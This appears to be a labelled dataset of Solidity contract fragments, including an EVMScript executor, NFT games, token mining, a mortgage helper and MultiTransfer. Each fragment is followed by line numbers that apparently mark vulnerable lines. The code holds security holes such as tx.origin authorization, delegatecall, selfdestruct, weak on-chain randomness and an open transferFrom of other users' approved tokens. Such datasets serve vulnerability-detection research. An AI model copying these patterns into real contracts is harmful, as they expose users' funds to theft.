    /// @notice Address of deployed CallsScript.sol contract
    address public immutable callsScript;
    /// @notice Address of depoyed easyTrack.sol contract
    address public easyTrack;
    // -------------
    // CONSTRUCTOR
    // -------------
    constructor(address _callsScript, address _easyTrack) {
        require(Address.isContract(_callsScript), ERROR_CALLS_SCRIPT_IS_NOT_CONTRACT);
        callsScript = _callsScript;
        _setEasyTrack(_easyTrack);
        StorageSlot.getUint256Slot(INITIALIZATION_BLOCK_POSITION).value = block.number;
    }
    // -------------
    // EXTERNAL METHODS
    // -------------
    /// @notice Executes EVMScript
    /// @dev Uses deployed Aragon's CallsScript.sol contract to execute EVMScript.
    /// @return Empty bytes
    function executeEVMScript(bytes memory _evmScript) external returns (bytes memory) {
        require(msg.sender == easyTrack, ERROR_CALLER_IS_FORBIDDEN);
        bytes memory execScriptCallData =
            abi.encodeWithSelector(
                ICallsScript.execScript.selector,
                _evmScript,
                new bytes(0),
                new address[](0)
            );
        (bool success, bytes memory output) = callsScript.delegatecall(execScriptCallData);
        if (!success) {
            assembly {
                let ptr := mload(0x40)
                let size := returndatasize()
                returndatacopy(ptr, 0, size)
                revert(ptr, size)
            }
        }
        emit ScriptExecuted(msg.sender, _evmScript);
        return abi.decode(output, (bytes));
    }
    function setEasyTrack(address _easyTrack) external onlyOwner {
        _setEasyTrack(_easyTrack);
    }
    function _setEasyTrack(address _easyTrack) internal {
        require(Address.isContract(_easyTrack), ERROR_EASY_TRACK_IS_NOT_CONTRACT);
        address oldEasyTrack = easyTrack;
        easyTrack = _easyTrack;
        emit EasyTrackChanged(oldEasyTrack, _easyTrack);
    }
}",[64]
"/// @title This contract manages the meta details of EthernalGo.
///     Registering to a board, splitting the revenues and other day-to-day actions that are unrelated to the actual game
/// @author https://www.EthernalGo.com
/// @dev See the GoGameLogic to understand the actual game mechanics and rules
contract GoBoardMetaDetails is GoGlobals {
    /// @dev The player added to board event can be used to check upon registration success
    event PlayerAddedToBoard(uint boardId, address playerAddress);
    /// @dev The board updated status can be used to get the new board status
    event BoardStatusUpdated(uint boardId, BoardStatus newStatus);
    /// @dev The player withdrawn his accumulated balance
    event PlayerWithdrawnBalance(address playerAddress);
    /// @dev Simple wrapper to return the number of boards in total
    function getTotalNumberOfBoards() public view returns(uint) {
        return allBoards.length;
    }
    /// @notice We would like to easily and transparantly share the game's statistics with anyone and present on the web-app
    function getCompletedGamesStatistics() public view returns(uint, uint) {
        uint completed = 0;
        uint ethPaid = 0;
        // @dev Go through all the boards, we start with 1 as it's an unsigned int
        for (uint i = 1; i <= allBoards.length; i++) {
            // Get the current board
            GoBoard storage board = allBoards[i - 1];
            // Check if it was a victory, otherwise it's not interesting as the players just got their deposit back
            if ((board.status == BoardStatus.BlackWin) || (board.status == BoardStatus.WhiteWin)) {
                ++completed;
                // We need to query the table stakes as the board's balance will be zero once a game is finished
                ethPaid += board.tableStakes.mul(2);
            }
        }
        return (completed, ethPaid);
    }
    /// @dev At this point there is no support for returning dynamic arrays (it's supported for web3 calls but not for internal testing) so we will ""only"" present the recent 50 games per player.
    uint8 constant PAGE_SIZE = 50;
    /// @dev Make sure this board is in waiting for result status
    modifier boardWaitingToResolve(uint boardId){
        require(allBoards[boardId].status == BoardStatus.WaitingToResolve);
        _;
    }
    /// @dev Make sure this board is in one of the end of game states
    modifier boardGameEnded(GoBoard storage board){
        require(isEndGameStatus(board.status));
        _;
    }
    /// @dev Make sure this board still has balance
    modifier boardNotPaid(GoBoard storage board){
        require(board.boardBalance > 0);
        _;
    }
    /// @dev Make sure this board still has a spot for at least one player to join
    modifier boardWaitingForPlayers(uint boardId){
        require(allBoards[boardId].status == BoardStatus.WaitForOpponent &&
                (allBoards[boardId].blackAddress == 0 ||
                 allBoards[boardId].whiteAddress == 0));
        _;
    }
    /// @dev Restricts games for the allowed table stakes
    /// @param value the value we are looking for to register
    modifier allowedValuesOnly(uint value){
        bool didFindValue = false;
        // The number of tableStakesOptions can change hence it has to be dynamic
        for (uint8 i = 0; i < tableStakesOptions.length; ++ i) {
           if (value == tableStakesOptions[i])
            didFindValue = true;
        }
        require (didFindValue);
        _;
    }
    /// @dev Checks a status if and returns if it's an end game
    /// @param status the value we are checking
    /// @return true if it's an end-game status
    function isEndGameStatus(BoardStatus status) public pure returns(bool) {
        return (status == BoardStatus.BlackWin) || (status == BoardStatus.WhiteWin) || (status == BoardStatus.Draw) || (status == BoardStatus.Canceled);
    }
    /// @dev Gets the update time for a board
    /// @param boardId The id of the board to check
    /// @return the update timestamp in seconds
    function getBoardUpdateTime(uint boardId) public view returns(uint) {
        GoBoard storage board = allBoards[boardId];
        return (board.lastUpdate);
    }
    /// @dev Gets the current board status
    /// @param boardId The id of the board to check
    /// @return the current board status
    function getBoardStatus(uint boardId) public view returns(BoardStatus) {
        GoBoard storage board = allBoards[boardId];
        return (board.status);
    }
    /// @dev Gets the current balance of the board
    /// @param boardId The id of the board to check
    /// @return the current board balance in WEI
    function getBoardBalance(uint boardId) public view returns(uint) {",[28]
"        uint playerTimeRemaining = PLAYER_TURN_SINGLE_PERIOD * getPlayerTimePeriods(board, actingPlayerColor);
        // If the player doesn't have enough time left, the player losses
        if (playerTimeRemaining < now - board.lastUpdate) {
            playerLost(board, boardId, actingPlayerColor);
        }
    }
    /// @dev Update a board status with a losing color
    /// @param board is the board to update.
    /// @param boardId is the board's Id.
    /// @param color is the losing player's color.
    function playerLost(GoBoard storage board, uint boardId, PlayerColor color) private {
        // If black is the losing color, white wins
        if (color == PlayerColor.Black) {
            updateBoardStatus(board, boardId, BoardStatus.WhiteWin);
        // If white is the losing color, black wins
        } else if (color == PlayerColor.White) {
            updateBoardStatus(board, boardId, BoardStatus.BlackWin);
        // There's an error, revert
        } else {
            revert();
        }
    }
    /// @dev Internally used to move to the next turn, by switching sides and updating the board last update time.
    /// @param board is the board to update.
    function nextTurn(GoBoard storage board) private {
        // Switch sides
        board.nextTurnColor = board.nextTurnColor == PlayerColor.Black ? PlayerColor.White : PlayerColor.Black;
        // Last update time
        board.lastUpdate = now;
    }
    /// @notice Adding a stone to a specific board and position (row & col).
    ///  Requires the board to be in progress, that the caller is the acting player,
    ///  and that the spot on the board is empty.
    /// @param boardId is the board to add the stone to.
    /// @param row is the row for the new stone.
    /// @param col is the column for the new stone.
    function addStoneToBoard(uint boardId, uint8 row, uint8 col) external {
        // Get the board & sender's color
        GoBoard storage board = allBoards[boardId];
        PlayerColor activeColor = getPlayerColor(board, msg.sender);
        // Verify the player can act
        require(board.status == BoardStatus.InProgress && board.nextTurnColor == activeColor);
        // Calculate the position
        uint8 position = row * BOARD_ROW_SIZE + col;
        // Check that it's an empty spot
        require(board.positionToColor[position] == 0);
        // Update the player timeout (if the player doesn't have time left, discontinue)
        if (updatePlayerTime(board, boardId, activeColor)) {
            // Set the stone on the board
            board.positionToColor[position] = uint8(activeColor);
            // Run capture / suidice logic
            updateCaptures(board, position, uint8(activeColor));
            // Next turn logic
            nextTurn(board);
            // Clear the pass flag
            if (board.didPassPrevTurn) {
                board.didPassPrevTurn = false;
            }
            // Fire the event
            StoneAddedToBoard(boardId, activeColor, row, col);
        }
    }
    /// @notice Returns a board's row details, specifies which color occupies which cell in that row.
    /// @dev It returns a row and not the entire board because some nodes might fail to return arrays larger than ~50.
    /// @param boardId is the board to inquire.
    /// @param row is the row to get details on.
    /// @return an array that contains the colors occupying each cell in that row.
    function getBoardRowDetails(uint boardId, uint8 row) external view returns (uint8[BOARD_ROW_SIZE]) {
        // The array to return
        uint8[BOARD_ROW_SIZE] memory rowToReturn;
        // For all columns, calculate the position and get the current status
        for (uint8 col = 0; col < BOARD_ROW_SIZE; col++) {
            uint8 position = row * BOARD_ROW_SIZE + col;
            rowToReturn[col] = allBoards[boardId].positionToColor[position];
        }
        // Return the array
        return (rowToReturn);
    }
    /// @notice Returns the current color of a specific position in a board.
    /// @param boardId is the board to inquire.
    /// @param row is part of the position to get details on.
    /// @param col is part of the position to get details on.
    /// @return the color occupying that position.
    function getBoardSingleSpaceDetails(uint boardId, uint8 row, uint8 col) external view returns (uint8) {
        uint8 position = row * BOARD_ROW_SIZE + col;
        return allBoards[boardId].positionToColor[position];
    }
    /// @dev Calcultes whether a position captures an enemy group, or whether it's a suicide.
    ///  Updates the board accoridngly (clears captured groups, or the suiciding stone).
    /// @param board the board to check and update
    /// @param position the position of the new stone
    /// @param positionColor the color of the new stone (this param is sent to spare another reading op)
    function updateCaptures(GoBoard storage board, uint8 position, uint8 positionColor) private {
        // Group positions, used later
        uint8[BOARD_SIZE] memory group;
        // Is group captured, or free
        bool isGroupCaptured;
        // In order to save gas, we check suicide only if the position is fully surrounded and doesn't capture enemy groups
        bool shouldCheckSuicide = true;
        // Get the position's adjacent cells
        uint8[MAX_ADJACENT_CELLS] memory adjacentArray = getAdjacentCells(position);
        // Run as long as there an adjacent cell, or until we reach the end of the array
        for (uint8 currAdjacentIndex = 0; currAdjacentIndex < MAX_ADJACENT_CELLS && adjacentArray[currAdjacentIndex] < MAX_UINT8; currAdjacentIndex++) {
            // Get the adjacent cell's color
            uint8 currColor = board.positionToColor[adjacentArray[currAdjacentIndex]];
            // If the enemy's color
            if (currColor != 0 && currColor != positionColor) {
                // Get the group's info
                (group, isGroupCaptured) = getGroup(board, adjacentArray[currAdjacentIndex], currColor);
                // Captured a group
                if (isGroupCaptured) {
                    // Clear the group from the board
                    for (uint8 currGroupIndex = 0; currGroupIndex < BOARD_SIZE && group[currGroupIndex] < MAX_UINT8; currGroupIndex++) {
                        board.positionToColor[group[currGroupIndex]] = 0;
                    }
                    // Shouldn't check suicide
                    shouldCheckSuicide = false;
                }
            // There's an empty adjacent cell
            } else if (currColor == 0) {
                // Shouldn't check suicide
                shouldCheckSuicide = false;
            }
        }
        // Detect suicide if needed
        if (shouldCheckSuicide) {
            // Get the new stone's surrounding group
            (group, isGroupCaptured) = getGroup(board, position, positionColor);","[44, 73, 85]"
"// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;
/*
       .
      "":""
    ___:____     |""\/""|
  ,'        `.    \  /
  |  O        \___/  |
~^~^~^~^~^~^~^~^~^~^~^~^~
Whales Game | Generative Yield NFTs
Mint tokens and earn KRILL with this new blockchain based game! Battle it out to see who can generate the most yield.
Website: https://whales.game/
*/
interface WhalesGameInterface {
	function getToken(uint256 _tokenId) external view returns (address tokenOwner, address approved, bytes32 seed, bool isWhale);
}
contract Metadata {
	string public name = ""Whales Game"";
	string public symbol = ""WG"";
	string constant private TABLE = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/';
	struct Trait {
		string trait;
		string[] names;
		string[] imgs;
	}
	struct Traits {
		string base;
		Trait[] traits;
	}
	struct Info {
		address owner;
		WhalesGameInterface wg;
		Traits whaleTraits;
		Traits fishermanTraits;
		string[] colors;
	}
	Info private info;
	modifier _onlyOwner() {
		require(msg.sender == owner());
		_;
	}
	constructor(string memory _whaleBase, string memory _fishermenBase, string[] memory _colors) {
		info.owner = msg.sender;
		info.whaleTraits.base = _whaleBase;
		info.fishermanTraits.base = _fishermenBase;
		info.colors = _colors;
	}
	function createTrait(bool _isWhale, string memory _trait, string[] memory _names, string[] memory _imgs) external _onlyOwner {
		require(_names.length > 0 && _names.length == _imgs.length);
		Traits storage _traits = _isWhale ? info.whaleTraits : info.fishermanTraits;
		_traits.traits.push(Trait(_trait, _names, _imgs));
	}
	function setOwner(address _owner) external _onlyOwner {
		info.owner = _owner;
	}
	function setWhalesGame(WhalesGameInterface _wg) external _onlyOwner {
		info.wg = _wg;
	}
	function deploySetWhalesGame(WhalesGameInterface _wg) external {
		require(tx.origin == owner() && whalesGameAddress() == address(0x0));
		info.wg = _wg;
	}
	function whalesGameAddress() public view returns (address) {
		return address(info.wg);
	}
	function owner() public view returns (address) {
		return info.owner;
	}
	function tokenURI(uint256 _tokenId) external view returns (string memory) {
		( , , bytes32 _seed, bool _isWhale) = info.wg.getToken(_tokenId);
		string memory _json = string(abi.encodePacked('{""name"":""', _isWhale ? 'Whale' : 'Fisherman', ' #', _uint2str(_tokenId), '"",""description"":""Some description content..."",'));
		_json = string(abi.encodePacked(_json, '""image"":""data:image/svg+xml;base64,', _encode(bytes(getRawSVG(_seed, _isWhale))), '"",""attributes"":['));
		_json = string(abi.encodePacked(_json, '{""trait_type"":""Type"",""value"":""', _isWhale ? 'Whale' : 'Fisherman', '""}'));
		(string[] memory _traits, string[] memory _values, ) = getRawTraits(_seed, _isWhale);
		for (uint256 i = 0; i < _traits.length; i++) {
			if (keccak256(bytes(_values[i])) != keccak256(bytes(""None""))) {
				_json = string(abi.encodePacked(_json, ',{""trait_type"":""', _traits[i], '"",""value"":""', _values[i], '""}'));
			}
		}
		_json = string(abi.encodePacked(_json, ']}'));
		return string(abi.encodePacked(""data:application/json;base64,"", _encode(bytes(_json))));
	}
	function getSVG(uint256 _tokenId) public view returns (string memory) {
		( , , bytes32 _seed, bool _isWhale) = info.wg.getToken(_tokenId);
		return getRawSVG(_seed, _isWhale);
	}
	function getRawSVG(bytes32 _seed, bool _isWhale) public view returns (string memory svg) {
		svg = string(abi.encodePacked('<svg xmlns=""http://www.w3.org/2000/svg"" version=""1.1"" preserveAspectRatio=""xMidYMid meet"" viewBox=""0 0 44 44"">'));
		uint256 _colorIndex = uint256(keccak256(abi.encodePacked('color:', _seed))) % info.colors.length;
		svg = string(abi.encodePacked(svg, '<rect width=""100%"" height=""100%"" fill=""#', info.colors[_colorIndex], '"" />'));
		Traits storage _traits = _isWhale ? info.whaleTraits : info.fishermanTraits;
		svg = string(abi.encodePacked(svg, '<image x=""6"" y=""6"" width=""32"" height=""32"" image-rendering=""pixelated"" href=""data:image/png;base64,', _traits.base, '""/>'));
		( , , uint256[] memory _indexes) = getRawTraits(_seed, _isWhale);
		for (uint256 i = 0; i < _indexes.length; i++) {
			svg = string(abi.encodePacked(svg, '<image x=""6"" y=""6"" width=""32"" height=""32"" image-rendering=""pixelated"" href=""data:image/png;base64,', _traits.traits[i].imgs[_indexes[i]], '""/>'));
		}
		svg = string(abi.encodePacked(svg, '</svg>'));
	}
	function getTraits(uint256 _tokenId) public view returns (string[] memory traits, string[] memory values) {
		( , , bytes32 _seed, bool _isWhale) = info.wg.getToken(_tokenId);
		(traits, values, ) = getRawTraits(_seed, _isWhale);
	}
	function getRawTraits(bytes32 _seed, bool _isWhale) public view returns (string[] memory traits, string[] memory values, uint256[] memory indexes) {
		bytes32 _last = _seed;
		Traits storage _traits = _isWhale ? info.whaleTraits : info.fishermanTraits;
		uint256 _length = _traits.traits.length;
		traits = new string[](_length);
		values = new string[](_length);
		indexes = new uint256[](_length);
		for (uint256 i = 0; i < _length; i++) {
			_last = keccak256(abi.encodePacked(_last));
			uint256 _index = uint256(_last) % _traits.traits[i].names.length;
			traits[i] = _traits.traits[i].trait;
			values[i] = _traits.traits[i].names[_index];
			indexes[i] = _index;
		}
	}
	function _uint2str(uint256 _value) internal pure returns (string memory) {
		uint256 _digits = 1;
		uint256 _n = _value;
		while (_n > 9) {
			_n /= 10;
			_digits++;
		}",[60]
"    uint public epochCount = 0;//number of 'blocks' mined
    uint public constant MAX_EPOCH_COUNT = 16000;
    uint public baseMiningReward = 2500 ether;
    uint public blocksPerReadjustment = 20;
    uint public tokensMinted;
    // solhint-disable var-name-mixedcase
    uint public _MINIMUM_TARGET = 2**16;
    uint public _MAXIMUM_TARGET = 2**250; //Testing setting!
    //uint public _MAXIMUM_TARGET = 2**230; //SHOULD MAKE THIS HARDER IN PRODUCTION
    uint public constant STARTING_DIFFICULTY = 0x00000000000b4963208fc24a4a15e9ea7c1556f9583f1941a7515fabbd194584;
    bytes32 public challengeNumber;
    uint public difficulty;
    uint public MINING_RATE_FACTOR = 31; //mint the token 31 times less often than ether
    //difficulty adjustment parameters- be careful modifying these
    uint public MAX_ADJUSTMENT_PERCENT = 100;
    uint public TARGET_DIVISOR = 2000;
    uint public QUOTIENT_LIMIT = TARGET_DIVISOR.div(2);
    mapping(bytes32 => bytes32) public solutionForChallenge;
    Statistics public statistics;
    PepeBase public pepeContract;
    PepToken public pepToken;
    PepeGrinder public pepeGrinder;
    uint256 public miningStart;//timestamp when mining starts
    event Mint(address indexed from, uint rewardAmount, uint epochCount, bytes32 newChallengeNumber);
    // track read only minting statistics
    struct Statistics {
        address lastRewardTo;
        uint lastRewardAmount;
        uint lastRewardEthBlockNumber;
        uint lastRewardTimestamp;
    }
    constructor(address _pepeContract, address _pepToken, address _pepeGrinder, uint256 _miningStart) public {
        pepeContract = PepeBase(_pepeContract);
        pepToken = PepToken(_pepToken);
        pepeGrinder = PepeGrinder(_pepeGrinder);
        difficulty = STARTING_DIFFICULTY;
        miningStart = _miningStart;
    }
    /**
     * Mint a new pepe if noce is correct
     * @param nonce The nonce to submit
     * @param challengeDigest The resulting digest
     * @return success Boolean indicating if mint was successful
     */
    // solhint-disable-next-line
    function mint(uint256 nonce, bytes32 challengeDigest) public returns (bool success) {
        require(epochCount < MAX_EPOCH_COUNT);//max 16k blocks
        // solhint-disable-next-line not-rely-on-time
        require(now > miningStart);
        // perform the hash function validation
        _hash(nonce, challengeDigest);
        // calculate the current reward
        uint rewardAmount = _reward(nonce);
        // increment the minted tokens amount
        tokensMinted += rewardAmount;
        epochCount += 1;
        challengeNumber = blockhash(block.number - 1);
        _adjustDifficulty();
        //populate read only diagnostics data
        // solhint-disable-next-line not-rely-on-time
        statistics = Statistics(msg.sender, rewardAmount, block.number, now);
        // send Mint event indicating a successful implementation
        emit Mint(msg.sender, rewardAmount, epochCount, challengeNumber);
        if (epochCount == MAX_EPOCH_COUNT) { //destroy this smart contract on the latest block
            selfdestruct(msg.sender);
        }
        return true;
    }
    /**
     * Get the current challengeNumber
     * @return bytes32 challengeNumber
     */
    function getChallengeNumber() public constant returns (bytes32) {
        return challengeNumber;
    }
    /**
     * Get the current mining difficulty
     * @return the current difficulty
     */
    function getMiningDifficulty() public constant returns (uint) {
        return _MAXIMUM_TARGET.div(difficulty);
    }
    /**
     * Get the mining target
     * @return The current mining target
     */
    function getMiningTarget() public constant returns (uint256) {
        return difficulty;
    }
    /**
     * Get the mining reward
     * @return The current mining reward. Always 2500PEP
     */
    function getMiningReward() public constant returns (uint256) {
        return baseMiningReward;
    }
    /**
     * Helper method to check a nonce
     * @param nonce The nonce to check
     * @param challengeDigest the digest to check
     * @param challengeNumber to check
     * @return digesttest The resulting digest
     */
    // solhint-disable-next-line
    function getMintDigest(uint256 nonce, bytes32 challengeDigest, bytes32 challengeNumber) public view returns (bytes32 digesttest) {
        bytes32 digest = keccak256(abi.encodePacked(challengeNumber, msg.sender, nonce));
        return digest;
    }
    /**
     * Helper method to check if a nonce meets the difficulty
     * @param nonce The nonce to check
     * @param challengeDigest the digest to check
     * @param challengeNumber the challenge number to check
     * @param testTarget the difficulty to check
     * @return success Boolean indicating success
     */
    function checkMintSolution(uint256 nonce, bytes32 challengeDigest, bytes32 challengeNumber, uint testTarget) public view returns (bool success) {
        bytes32 digest = keccak256(abi.encodePacked(challengeNumber, msg.sender, nonce));
        if (uint256(digest) > testTarget) revert();
        return (digest == challengeDigest);
    }
    /**
     * Internal function to check a hash
     * @param nonce The nonce to check
     * @param challengeDigest it should create
     * @return digest The digest created
     */
    function _hash(uint256 nonce, bytes32 challengeDigest) internal returns (bytes32 digest) {","[64, 65]"
"        @return The id of the mortgage
    */
    function requestMortgage(
        uint256[6] loanParams,
        string metadata,
        uint256 landId,
        uint8 v,
        bytes32 r,
        bytes32 s
    ) external returns (uint256) {
        // Create a loan with the loanParams and metadata
        uint256 loanId = createLoan(loanParams, metadata);
        // Load NanoLoanEngine address
        NanoLoanEngine _nanoLoanEngine = nanoLoanEngine;
        // Approve the created loan with the provided signature
        require(_nanoLoanEngine.registerApprove(_nanoLoanEngine.getIdentifier(loanId), v, r, s), ""Signature not valid"");
        // Calculate the requested amount for the mortgage deposit
        uint256 requiredDeposit = ((readLandCost(landId) * requiredTotal) / 100) - _nanoLoanEngine.getAmount(loanId);
        // Pull the required deposit amount
        Token _mana = mana;
        _tokenTransferFrom(_mana, msg.sender, this, requiredDeposit);
        require(_mana.approve(mortgageManager, requiredDeposit), ""Error approve MANA transfer"");
        // Create the mortgage request
        uint256 mortgageId = mortgageManager.requestMortgageId(
            Engine(_nanoLoanEngine),
            landMarket,
            loanId,
            requiredDeposit,
            landId,
            tokenConverter
        );
        require(_mana.approve(mortgageManager, 0), ""Error remove approve MANA transfer"");
        emit NewMortgage(msg.sender, loanId, landId, mortgageId);
        return mortgageId;
    }
    function readLandCost(uint256 _landId) internal view returns (uint256 landCost) {
        (, , landCost, ) = landMarket.auctionByAssetId(_landId);
    }
    /**
        @notice Pays a loan using mana
        @dev The amount to pay must be set on mana
        @param engine RCN Engine
        @param loan Loan id to pay
        @param amount Amount in MANA to pay
        @return True if the payment was performed
    */
    function pay(address engine, uint256 loan, uint256 amount) external returns (bool) {
        emit PaidLoan(engine, loan, amount);
        bytes32[4] memory loanParams = [
            bytes32(engine),
            bytes32(loan),
            bytes32(amount),
            bytes32(msg.sender)
        ];
        uint256[3] memory converterParams = [
            marginSpend,
            amount.safeMult(uint256(100000).safeAdd(maxSpend)) / 100000,
            rebuyThreshold
        ];
        require(address(converterRamp).delegatecall(
            bytes4(0x86ee863d),
            address(tokenConverter),
            address(mana),
            loanParams,
            0x140,
            converterParams,
            0x0
        ), ""Error delegate pay call"");
    }
    function _tokenTransferFrom(Token token, address from, address to, uint256 amount) internal {
        require(token.balanceOf(from) >= amount, ""From balance is not enough"");
        require(token.allowance(from, address(this)) >= amount, ""Allowance is not enough"");
        require(token.transferFrom(from, to, amount), ""Transfer failed"");
    }
    function _isContract(address addr) internal view returns (bool) {
        uint size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}","[60, 61, 62, 63, 64, 65, 66, 67, 68]"
"pragma solidity ^0.5.0;
/**
 * @title An amazing project called mulit_transfer
 * @dev This contract is the base of our project
 */
contract MultiTransfer is Ownable{
    address public tokenAddress;
    uint256 public minThreshold;
    address public collector;
    mapping(address => bool) public whitelists;
    constructor (address _tokenAddress,
                 address _collector,
                 uint256 _minThreshold) public {
        require(_tokenAddress != address(0) && _collector != address(0) && _minThreshold > 0, ""invalid params"");
        tokenAddress = _tokenAddress;
        collector = _collector;
        minThreshold = _minThreshold;
        whitelists[msg.sender] = true;
        whitelists[collector] = true;
    }
    function() external payable {}
    function transferToken(address _from, uint256 _amount) internal {
        require(_from != address(0) && _amount >= minThreshold , ""invalid from or amount"");
        IERC20(tokenAddress).transferFrom(_from, collector, _amount);
    }
    function multiTransferToken(address[] memory _froms, uint256[] memory _amounts) public {
        require(_froms.length == _amounts.length, ""invalid transfer token counts"");
        for(uint256 i = 0; i<_froms.length; i++ ){
            transferToken(_froms[i], _amounts[i]);
        }
    }
    function multiTransferETH(address[] memory _receives, uint256[] memory _amounts) public {
        require(whitelists[msg.sender], ""invalid sender"");
        require(_receives.length == _amounts.length, ""invalid transfer eth counts"");
        uint256 count = 0;
        uint256 i = 0;
        for(i = 0; i < _amounts.length; i++){
            count += _amounts[i];
        }
        require(address(this).balance >= count, ""contract balance not enough"");
        for(i = 0; i < _receives.length; i++){
            address payable receiver = address(uint160(_receives[i]));
            receiver.transfer(_amounts[i]);
        }
    }
    function configureThreshold(uint256 _minThreshold) public onlyOwner {
        require(_minThreshold > 0, ""invalid threshold"");
        minThreshold = _minThreshold;
    }
    function modifyTokenAddress(address _tokenAddress) public onlyOwner{
        require(_tokenAddress != address(0), ""invalid token address"");
        tokenAddress = _tokenAddress;
    }
    function modifyCollector(address _collector) public onlyOwner {
        require(_collector != address(0), ""invalid collector address"");
        collector = _collector;
    }
    function modifyWhitelist(address _user, bool _isWhite) public onlyOwner {
        require(_user != address(0), ""invalid user"");
        whitelists[_user] = _isWhite;
    }
    function claimTokens(address _token) public onlyOwner {
        if (_token == address(0)) {
            address payable owner = address(uint160(owner()));
            owner.transfer(address(this).balance);
            return;
        }
        IERC20 erc20token = IERC20(_token);
        uint256 balance = erc20token.balanceOf(address(this));
        erc20token.transfer(owner(), balance);
    }
}",[43]
"pragma solidity 0.7.5;
// Inheritance
/// @title   UMB to NFT swapping contract
/// @author  umb.network
contract NFTRewards is Ownable {
    using SafeMath for uint;
    using SafeERC20 for IERC20;
    address public umbToken;
    address public leftoverReceiver;
    uint256 public multiplier;
    uint256 public rewardsDeadline;
    mapping(address => uint) public balances;
    constructor(address _umbToken, address _leftoverReceiver) {
        require(_umbToken != address(0x0), ""should be non-null UMB token address"");
        require(_leftoverReceiver != address(0x0), ""should be non-null leftoverReceiver address"");
        umbToken = _umbToken;
        leftoverReceiver = _leftoverReceiver;
    }
    function balanceOf(address _addr) view public returns(uint256) {
        return balances[_addr].mul(multiplier);
    }
    function startRewards(
        uint _multiplier,
        address[] calldata _addresses,
        uint[] calldata _balances,
        uint _duration
    ) external onlyOwner {
        require(_duration > 0, ""duration should be positive"");
        require(rewardsDeadline == 0, ""can start rewards one time"");
        require(_multiplier > 0, ""multiplier must be positive"");
        require(_addresses.length > 0, ""should be at least 1 address"");
        require(_addresses.length == _balances.length, ""should be the same number of addresses and balances"");
        for (uint i = 0; i < _addresses.length; i++) {
            balances[_addresses[i]] = _balances[i];
        }
        multiplier = _multiplier;
        rewardsDeadline = block.timestamp + _duration;
    }
    function close() external {
        require(block.timestamp > rewardsDeadline, ""cannot close the contract right now"");
        uint umbBalance = IERC20(umbToken).balanceOf(address(this));
        if (umbBalance > 0) {
            require(IERC20(umbToken).transfer(leftoverReceiver, umbBalance), ""transfer failed"");
        }
        selfdestruct(msg.sender);
    }
    function claimUMB() external {
        uint nftAmount = balances[msg.sender];
        require(nftAmount > 0, ""amount should be positive"");
        balances[msg.sender] = 0;
        uint umbAmount = nftAmount.mul(multiplier);
        IERC20(umbToken).safeTransfer(msg.sender, umbAmount);
        emit Claimed(msg.sender, nftAmount, umbAmount);
    }
    event Claimed(
        address indexed receiver,
        uint nftAmount,
        uint umbAmount);
}","[39, 45]"
"            revealed = true;
        }
        emit MintEvent(nextTokenId);
    }
    function breed(uint256 tokenId1, uint256 tokenId2) external payable {
        require(publicTime > 0 && block.timestamp >= publicTime);
        require(revealed, ""Not revealed"");
        require(lastBreedTime <= 0 || block.timestamp - lastBreedTime < BREED_ENDING_TIME);
        require(!msg.sender.isContract());
        require(ownerOf(tokenId1) == address(msg.sender) && ownerOf(tokenId2) == address(msg.sender));
        require(_breedPrice <= msg.value, 'Inconsistent eth sent');
        uint256 parentInfo1 = _butterfliesInfo[tokenId1];
        uint256 parentInfo2 = _butterfliesInfo[tokenId2];
        // require breed state, make sure the parent can breed
        uint256 parentBreedcount1 = uint8a32.get(parentInfo1, DATA_BREED_COUNT);
        require(parentBreedcount1 > 0, 'Parent1 cannot breed');
        uint256 parentBreedcount2 = uint8a32.get(parentInfo2, DATA_BREED_COUNT);
        require(parentBreedcount2 > 0, 'Parent2 cannot breed');
        require(uint8a32.get(parentInfo1, DATA_SEX) != uint8a32.get(parentInfo2, DATA_SEX), 'Gender dismatch');
        uint256 parentGen1 = uint8a32.get(parentInfo1, DATA_GEN);
        uint256 parentGen2 = uint8a32.get(parentInfo2, DATA_GEN);
        // the next generation depends on the older generation
        uint256 childGeneration = parentGen1 < parentGen2 ? parentGen1 + 1: parentGen2 + 1;
        _butterfliesInfo[tokenId1] = uint8a32.set(parentInfo1, DATA_BREED_COUNT, parentBreedcount1 - 1);
        _butterfliesInfo[tokenId2] = uint8a32.set(parentInfo2, DATA_BREED_COUNT, parentBreedcount2 - 1);
        // generate child info
        (uint256 sex, uint256 seed) = _generateInfo(nextTokenId, childGeneration);
        // mint the child
        _safeMint(msg.sender, nextTokenId);
        // add breed fee
        currentBonus += _breedPrice;
        // update nextToken
        nextTokenId ++;
        // update breed record
        address sender = address(msg.sender);
        uint256 src;
        for (uint256 i; i < 10; i ++) {
            if (_lastBreedAddress[i] == sender) {
                src = i;
                break;
            }
        }
        for (uint256 j = src; j < 9; j ++) {
            _lastBreedAddress[j] = _lastBreedAddress[j + 1];
        }
        _lastBreedAddress[9] = sender;
        lastBreedTime = block.timestamp;
        // holding 5st generation has 50% chance to get breed fee back
        bool feeback;
        if (random(seed, 0) % 2 == 0) {
            uint256 len = _tokensOf5thGen.length;
            if (len > 0) {
                for (uint256 m; m < len; m++) {
                    address holder = ownerOf(_tokensOf5thGen[m]);
                    if (holder == sender) {
                        payable(sender).transfer(_breedPrice);
                        currentBonus -= _breedPrice;
                        feeback = true;
                        break;
                    }
                }
            }
        }
        // 5st generation add to list
        if (childGeneration > 4) {
            _tokensOf5thGen.push(childGeneration);
        }
        // address who bred Androgynous one may get the 50% of current bonus value
        if (sex == SEX_BOTH && currentBonus <= address(this).balance) {
            uint256 bredBonus = currentBonus / 2;
            currentBonus = currentBonus - bredBonus;
            payable(sender).transfer(bredBonus);
            // add 1eth to current bonus when 500 increased
            fillBonusEvery500();
            // emit event
            emit BreedEvent(msg.sender, nextTokenId-1, _butterfliesInfo[nextTokenId-1], bredBonus, feeback);
            // store bonus records
            uint256 cnt = _bredBonusAddrs.length;
            for (uint256 n; n < cnt; n ++) {
                if (_bredBonusAddrs[n] == sender){
                    _bredBonusValues[n] += bredBonus;
                    return;
                }
            }
            _bredBonusAddrs.push(sender);
            _bredBonusValues.push(bredBonus);
            return;
        }
        // add 1eth to current bonus when 500 increased
        fillBonusEvery500();
        // emit event
        emit BreedEvent(msg.sender, nextTokenId-1, _butterfliesInfo[nextTokenId-1], 0, feeback);
    }
    function fillBonusEvery500() internal {
        // add 1eth to current bonus when 500 increased
        if ((nextTokenId - _maxSupply1stGen) % 500 == 1) {
